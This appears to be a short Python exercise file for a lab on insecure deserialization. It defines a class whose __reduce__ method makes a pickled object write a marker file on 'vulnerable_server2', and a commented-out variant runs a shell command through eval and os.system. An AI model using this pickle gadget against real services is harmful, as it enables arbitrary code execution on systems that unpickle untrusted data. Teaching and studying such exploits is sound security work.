#Modify attacker.py and use this object to attack vulnerable_server2
from pathlib import Path
import builtins

class MyClass(object):
    def __reduce__(self):
      return Path('/tmp/you-got-owned').write_text, ('hi',)
      #code = "__import__('os').system('touch /tmp/you-got-owned')"
      #return builtins.eval, (code,)